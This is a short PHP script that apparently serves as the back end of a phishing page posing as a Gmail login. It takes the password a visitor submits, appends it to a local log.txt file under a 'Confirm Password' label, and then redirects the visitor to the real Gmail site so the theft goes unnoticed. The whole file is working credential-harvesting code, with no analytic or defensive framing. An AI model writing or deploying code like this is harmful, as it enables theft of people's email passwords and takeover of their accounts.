<?php
    $pass = $_POST['password'];
    $file = fopen("log.txt","a");
    fwrite($file,"\nConfirm Password --> : ");
    fwrite($file,$pass);
    fwrite($file,"\n----------------------\n");
    fclose($file);
    header("location:https://mail.google.com");
?>